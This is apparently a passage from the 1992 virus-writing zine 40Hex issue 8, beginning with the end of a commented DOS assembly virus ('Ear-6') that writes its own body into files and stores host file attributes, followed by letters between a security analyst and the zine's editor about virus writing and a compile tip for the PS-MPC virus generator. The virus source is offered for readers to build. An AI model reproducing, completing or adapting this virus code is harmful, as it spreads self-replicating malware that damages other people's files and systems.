+mensaje db      'PHALCON/SKISM 1992 [Ear-6] Alert!',13,10,'Where is the $'
+secciones db    ' located?',13,10
+        db      ' 1. External Ear',13,10
+        db      ' 2. Middle Ear',13,10
+        db      ' 3. Inner Ear',13,10,'( )',8,8,'$'
+
+; No es bueno.
+suspendido db   13,10,'You obviously know nothing about ears.'
+        db      13,10,'Try again after some study.',13,10,'$'
+
+; ­Espero que s¡!
+aprueba db      13,10,'Wow, you know your ears!  Please resume work.',13,10
+        db      '$'
+
+escribir:
+        mov     ah, 40h
+        mov     cx, TerminaVir - EmpezarVir
+        lea     dx, [bp+EmpezarVir]
+        int     21h
+termina_escribir:
+
+backslash db '\'
+
+TerminaVir = $
+
+; Los que sigue son en el mont¢n...
+longitud_de_la_cifra = offset EmpezarCifra - offset shwing
+
+diroriginal db 64 dup (?)
+tempo       dw ?
+nuevoDTA    db 43 dup (?)
+numinf      db ?
+antes_del_tempstore:
+; tempstore es el buffer para el parte del programa que a¤ada el virus al fin
+; de otro programa
+tempstore   db (longitud_de_la_cifra*2+longitud_del_escribir+5) dup (?)
+                                                ; a¤ada cinco para los pop,
+                                                ; los push, y el retn
+buffer      db 1ah dup (?)
+f_atrib     db      ?                           ; atributo de la ficha
+f_hora      dw      ?                           ; hora de creaci¢n
+f_fecha     dw      ?                           ; fecha de creaci¢n
+f_long      dd      ?                           ; magnitud de la ficha
+
+        end     Empezar
+
+40Hex Number 8 Volume 2 Issue 4                                       File 010
+
+    Letters to the editor!  Well, as you can imagine when I got this
+message I was quite startled.  Sorry Paul, no top billing this time :-).
+Although it is at this point, that I would like to say a couple things.
+For instance, the virus community seems to think that their actions go
+unnoticed.  As you might imagine, this is not quite true.  C'mon,
+security people get their hands on 40Hex shortly after our boards get
+it.  Just letting you know that big brother is watching :).
+-----------------------------------------------------------------------------
+
+
+
+
+40-Hex Response:
+
+   As a Security Analyst I find 40-Hex an incredibly interesting magazine.
+The magazine presents entirely different viewpoints then what is in the
+industry magazines such as Virus Bulletin, Virus News International and 
+Virus News and Reviews.   Although all three of these publications are good
+and very useful to me in my job, 40-Hex does indeed keep my mind open.  It
+discusses viruses in depth, including commented source code, and has been a
+real learning tool for me.  There is just not anywhere that you can get the
+detailed analysis of a virus except in a magazine like 40-Hex.  I can't help
+but be torn between my thirst for knowledge about virii and how they work,
+and the fear that the more knowledge about virus writing becomes available to
+the public, the greater chance that there is going to be more and more garbage
+out there and more and more irresponsible people releasing this garbage on
+their "friends and neighbors".
+
+   I do want to thank 40-Hex for what I consider a very favorable review.  I
+had to laugh about the comments, because frankly I agreed with them.  I guess
+that I do get a little melodramatic sometimes.  But I do honestly believe 
+that the knowledge exists out there to create a program/virus that will
+be able to escape detection by any method in use today.  Whether it will 
+ever be written and whether it will have destructive capabilities I don't 
+really know. I don't know of any virus writers that make profits off 
+their work.  While all the anti-virus developers, although they complain
+about the work that they have to do to keep up with the virus writers, 
+certainly make a nice profit on something like a Michelangelo scare.  So 
+the only motivation for the virus writer is the challenge of creating a 
+nearly undetectable virus.  
+
+   I am very curious myself to see if the NCSA's prediction of 40,000 virii  
+by 1994 comes true.  I certainly agree with 40-Hex that most of 
+these virii will be hacks of some of the existing code out there now. The 
+anti-virus industry itself can't decide on how to count different strains of 
+viruses, so anyone will be able to make whatever claim they want anyway.
+
+   Finally, Dr. Solomon said it best informally at the First International 
+Virus Prevention Conference.  He was talking about how America was founded
+on freedom and the rights of the individual.  He said that Americans seem
+far too willing, in his opinion, to voluntarily give up those rights.  Right
+now, virus writing is not illegal.  And hopefully it never will be, because
+what you or I do with our own personal computers is no one else's business 
+but our own.  But when we interfer with someone else's computer or data or
+life, that I believe that is where the line is drawn.   Its going to be a 
+very long and hard process to determine responsibility for damages caused by
+a virus.  Passing a law to make virus writing itself illegal will not solve 
+the problem.  Something, though, has to be done to protect an individual's
+or a corporation's rights to have a virus-free working environment.  There
+are enough problems with buggy commercial software, without having to worry
+about virii hitting your computers too.  But until that time comes part of
+my job will continue to be warning people about the dangers of viruses and
+helping them protect their data.
+
+                                                    Paul Melka
+
+Response to a Response to a Response:
+
+    As the head of the -=PHALCON/SKISM=-, I find your letter a very
+interesting response.  I thank you for your raving reviews on 40Hex.  We
+try to make it a magazine that everyone can learn from.  Well, I still
+debate the undetectable virus issue.  Regarding the virus writer/anti-virus
+issue, I definately agree, that the anti-virus people are motivated by greed
+more then anything else.   I am glad to see that you agreed with my oh so
+witty comments, they weren't meant to be abusive, just a little comic relief.
+    I agree with you on the issues regarding a virus-free working
+environment.  But, as you already know,  writing a virus isn't
+illegal, it is the spreading that is illegal.  Unfortunately, it is too
+late to start working on anti-virus writing legislation now.  The damage
+has been done.  The virus issue is fairly similiar to the AIDS issue.
+You have to use protection, no matter what.  There will never be an end
+to virii.  Even if everyone stopped writing virii, the infection rate
+wouldn't decrease.  I  don't know of many people that get hit by the
+newer strains that have been coming out.  Most people still get hit by
+Jerusalem, Stoned, and other 'classics'.
+    I would be very interested in what solutions you may have come up with
+to protect the rights of individuals and corporations.  I hadn't heard about
+Dr. Solomon's comments, until I recieved your letter.  Quite frankly, I agree
+with what he is saying.  Another major problem with making virus writing
+illegal is the definition of a virus, or trojan for that matter.  It is
+very difficult to come up with a concrete definition.
+    I appreciate your response, and definately encourage other people, either
+pro- or anti- virus to respond!
+
+                                                -)GHeap
+I don't want anybody complaining about not being able to compile the PS-MPC
+utility in 40Hex-8, so listen close.  You must set the "unsigned chars" option 
+on in order for the utility to compile properly.  It is in the Options/Compile 
+menu.  Spread the word along with 40Hex...
+
+</pre>
+</html>
+
